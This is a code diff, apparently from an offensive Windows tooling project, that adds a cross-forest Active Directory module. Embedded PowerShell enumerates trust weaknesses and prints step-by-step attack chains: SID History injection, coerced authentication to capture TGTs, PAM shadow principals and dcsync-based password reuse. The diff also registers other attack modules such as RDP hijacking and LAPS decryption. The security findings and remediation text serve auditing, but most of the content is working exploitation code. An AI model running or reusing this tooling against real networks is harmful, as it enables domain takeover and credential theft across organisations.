+        Write-Output "    SID Filtering: $isSIDFiltered"
+        Write-Output "    Forest Transitive: $isForestTransitive"
+        Write-Output "    Selective Auth: $isSelectiveAuth"
+        Write-Output "    PAM Trust: $isPAM"
+
+        if (-not $isSIDFiltered) {
+            Write-Output "    [!] SID FILTERING DISABLED — SID History injection across trust is possible"
+        }
+        if ($isPAM) {
+            Write-Output "    [!] PAM TRUST — SID filtering is inherently disabled, shadow principals can be created"
+        }
+        if (-not $isSelectiveAuth) {
+            Write-Output "    [!] Non-selective auth — any authenticated user in trusted domain can access resources"
+        }
+    }
+    Write-Output ""
+}
+
+# Forest trusts
+Write-Output "=== FOREST TRUSTS ==="
+$forestTrusts = $currentForest.GetAllTrustRelationships()
+foreach ($trust in $forestTrusts) {
+    Write-Output "[+] Forest Trust: $($trust.TargetName) — Direction: $($trust.TrustDirection), Type: $($trust.TrustType)"
+}
+Write-Output ""
+
+# Foreign group memberships (users from other domains in local groups)
+Write-Output "=== FOREIGN PRINCIPALS ==="
+$foreignSearcher = [System.DirectoryServices.DirectorySearcher]::new()
+$foreignSearcher.Filter = "(objectClass=foreignSecurityPrincipal)"
+$foreignSearcher.PropertiesToLoad.AddRange(@("cn","name","objectSid"))
+$foreignPrincipals = $foreignSearcher.FindAll()
+Write-Output "[+] Foreign Security Principals: $($foreignPrincipals.Count)"
+foreach ($fp in $foreignPrincipals) {
+    $sid = New-Object System.Security.Principal.SecurityIdentifier(([byte[]]$fp.Properties["objectSid"][0]), 0)
+    try {
+        $account = $sid.Translate([System.Security.Principal.NTAccount]).Value
+        Write-Output "    $sid -> $account"
+    } catch {
+        Write-Output "    $sid -> (cannot resolve — cross-forest account)"
+    }
+}
+Write-Output ""
+
+# Unconstrained delegation across trusts
+Write-Output "=== UNCONSTRAINED DELEGATION (Cross-Trust Risk) ==="
+$unDelSearcher = [System.DirectoryServices.DirectorySearcher]::new()
+$unDelSearcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!primaryGroupID=516))"
+$unDelSearcher.PropertiesToLoad.AddRange(@("cn","dNSHostName","operatingSystem"))
+$unDelResults = $unDelSearcher.FindAll()
+if ($unDelResults.Count -gt 0) {
+    Write-Output "[!] Non-DC computers with unconstrained delegation: $($unDelResults.Count)"
+    Write-Output "    These can capture TGTs from cross-trust authentication!"
+    foreach ($c in $unDelResults) {
+        Write-Output "    $($c.Properties["cn"][0]) — $($c.Properties["operatingSystem"])"
+    }
+} else {
+    Write-Output "[+] No non-DC unconstrained delegation found"
+}
+Write-Output ""
+
+# Check for shared credentials (same username across trusts)
+Write-Output "=== SHARED CREDENTIAL RISK ==="
+Write-Output "[*] Checking for krbtgt hash reuse indicators..."
+$krbtgt = [System.DirectoryServices.DirectorySearcher]::new()
+$krbtgt.Filter = "(sAMAccountName=krbtgt)"
+$krbtgt.PropertiesToLoad.AddRange(@("pwdLastSet"))
+$krbtgtResult = $krbtgt.FindOne()
+if ($krbtgtResult) {
+    $pwdLastSet = [DateTime]::FromFileTime([Int64]$krbtgtResult.Properties["pwdLastSet"][0])
+    Write-Output "[+] krbtgt password last set: $pwdLastSet"
+    $daysSinceChange = ([DateTime]::Now - $pwdLastSet).Days
+    if ($daysSinceChange -gt 365) {
+        Write-Output "    [!] krbtgt password is $daysSinceChange days old — golden ticket risk"
+    }
+}
+` : `
+Write-Output "[*] Cross-forest exploitation..."
+${!targetForest ? 'Write-Output "[!] Required: --target-forest FOREST_NAME"; exit 1' : ""}
+${!vector ? 'Write-Output "[!] Required: --vector <sidfilter|delegation|foreign_groups|pam|shared_creds>"; exit 1' : ""}
+
+${vector === "sidfilter" ? `
+Write-Output "[*] Checking SID filtering status for ${targetForest}..."
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+$searcher.Filter = "(&(objectClass=trustedDomain)(name=${targetForest}))"
+$searcher.PropertiesToLoad.AddRange(@("trustAttributes"))
+$trust = $searcher.FindOne()
+if ($trust) {
+    $attrs = [int]$trust.Properties["trustAttributes"][0]
+    if (($attrs -band 0x4) -eq 0) {
+        Write-Output "[!] SID Filtering DISABLED for ${targetForest}"
+        Write-Output "    SID History injection is possible:"
+        Write-Output "    1. Compromise a user in the current domain"
+        Write-Output "    2. Inject SID of a privileged group from ${targetForest} into SID History"
+        Write-Output "    3. Authenticate to ${targetForest} — the injected SID grants access"
+        Write-Output ""
+        Write-Output "    Use: sid_history --action inject --target USER --sid S-1-5-21-...-512"
+    } else {
+        Write-Output "[+] SID Filtering is enabled — SID History injection blocked"
+        Write-Output "    Check for PAM trust or other bypass vectors"
+    }
+} else {
+    Write-Output "[-] Trust to ${targetForest} not found"
+}
+` : vector === "delegation" ? `
+Write-Output "[*] Checking unconstrained delegation across trust to ${targetForest}..."
+Write-Output "[*] If a server with unconstrained delegation in THIS domain is accessed by"
+Write-Output "    a user from ${targetForest}, their TGT will be cached and can be extracted."
+Write-Output ""
+Write-Output "    Attack chain:"
+Write-Output "    1. Identify servers with unconstrained delegation (see enum results)"
+Write-Output "    2. Coerce auth from DC or privileged user in ${targetForest}"
+Write-Output "       Use: ntlm_coerce --target DC_OF_${targetForest} --listener DELEG_SERVER"
+Write-Output "    3. Extract TGT: pass_the_ticket --action list"
+Write-Output "    4. Use TGT to access ${targetForest} resources"
+` : vector === "foreign_groups" ? `
+Write-Output "[*] Enumerating foreign group memberships for ${targetForest}..."
+try {
+    $targetContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest", "${targetForest}")
+    $targetDomain = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($targetContext).RootDomain
+
+    Write-Output "[+] Connected to ${targetForest}"
+    Write-Output "[*] Looking for accounts from our domain in ${targetForest}'s groups..."
+
+    # Search for our domain's SID in foreign security principals
+    $currentDomainSid = (New-Object System.Security.Principal.NTAccount($env:USERDOMAIN, "Domain Admins")).Translate([System.Security.Principal.SecurityIdentifier]).AccountDomainSid.Value
+    $foreignSearcher = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new("LDAP://$($targetDomain.Name)"))
+    $foreignSearcher.Filter = "(&(objectClass=foreignSecurityPrincipal)(cn=$currentDomainSid*))"
+    $foreignResults = $foreignSearcher.FindAll()
+    Write-Output "[+] Our domain's principals in ${targetForest}: $($foreignResults.Count)"
+    foreach ($fp in $foreignResults) {
+        Write-Output "    $($fp.Properties["cn"][0])"
+    }
+} catch {
+    Write-Output "[!] Cannot connect to ${targetForest}: $_"
+}
+` : vector === "pam" ? `
+Write-Output "[*] Checking for PAM trust with ${targetForest}..."
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+$searcher.Filter = "(&(objectClass=trustedDomain)(name=${targetForest}))"
+$searcher.PropertiesToLoad.AddRange(@("trustAttributes"))
+$trust = $searcher.FindOne()
+if ($trust) {
+    $attrs = [int]$trust.Properties["trustAttributes"][0]
+    if ($attrs -band 0x400) {
+        Write-Output "[!] PAM TRUST DETECTED with ${targetForest}"
+        Write-Output "    SID filtering is inherently disabled in PAM trusts"
+        Write-Output "    Shadow principals can be created in the bastion forest"
+        Write-Output "    These map to accounts in the production forest"
+        Write-Output ""
+        Write-Output "    Attack: Create shadow principal → instant access to production forest"
+    } else {
+        Write-Output "[+] Not a PAM trust — check for other vectors"
+    }
+} else {
+    Write-Output "[-] Trust to ${targetForest} not found"
+}
+` : `
+Write-Output "[*] Checking for shared credential patterns with ${targetForest}..."
+Write-Output "    If administrators use the same password across forests,"
+Write-Output "    a compromised hash from one forest works in the other."
+Write-Output ""
+Write-Output "    Common patterns:"
+Write-Output "    - Same admin account name with same password"
+Write-Output "    - Service accounts reused across forests"
+Write-Output "    - krbtgt hash reuse (rare but devastating)"
+Write-Output ""
+Write-Output "    Use dcsync + hashcat to check password reuse across forests"
+`}
+`}
+`
+
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+
+  if (action === "enum") {
+    const sidFilterOff = (result.stdout.match(/SID FILTERING DISABLED/g) || []).length
+    const pamTrust = (result.stdout.match(/PAM TRUST/g) || []).length
+    const unDeleg = result.stdout.match(/unconstrained delegation:\s*(\d+)/)
+
+    if (sidFilterOff > 0) {
+      findings.push({
+        checkId: "WIN-TRUST-001",
+        provider: "windows",
+        severity: "critical",
+        status: "VULNERABLE",
+        resource: "ad://trusts",
+        title: `${sidFilterOff} trust(s) with SID filtering disabled`,
+        details: "SID History injection possible across trust boundary",
+        remediation: "Enable SID filtering: netdom trust DOMAIN /domain:TARGET /quarantine:yes",
+      })
+    }
+    if (pamTrust > 0) {
+      findings.push({
+        checkId: "WIN-TRUST-002",
+        provider: "windows",
+        severity: "critical",
+        status: "VULNERABLE",
+        resource: "ad://trusts",
+        title: "PAM trust detected — SID filtering inherently disabled",
+        details: "Privileged Access Management trust allows shadow principal creation",
+        remediation: "Review PAM trust necessity. Audit shadow principal creation events.",
+      })
+    }
+    if (unDeleg && parseInt(unDeleg[1]) > 0) {
+      findings.push({
+        checkId: "WIN-TRUST-003",
+        provider: "windows",
+        severity: "high",
+        status: "ENUMERATED",
+        resource: "ad://delegation",
+        title: `${unDeleg[1]} non-DC servers with unconstrained delegation (cross-trust TGT capture risk)`,
+        details: "Cross-trust authentication to these servers exposes TGTs for extraction",
+        remediation: "Remove unconstrained delegation. Use constrained delegation or RBCD instead.",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+
+
 // ── Dispatch ──
 
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
@@ -9347,6 +10951,14 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   certifried: certifried,
   bad_successor: badSuccessor,
   bronze_bit: bronzeBit,
+  adcs_esc_advanced: adcsEscAdvanced,
+  coercer_full: coercerFull,
+  rdp_hijack: rdpHijack,
+  token_stomp: tokenStomp,
+  adws_recon: adwsRecon,
+  laps_v2_decrypt: lapsV2Decrypt,
+  primary_group_abuse: primaryGroupAbuse,
+  cross_forest: crossForest,
 }
 
 export const WinhookTool = Tool.define("winhook", {
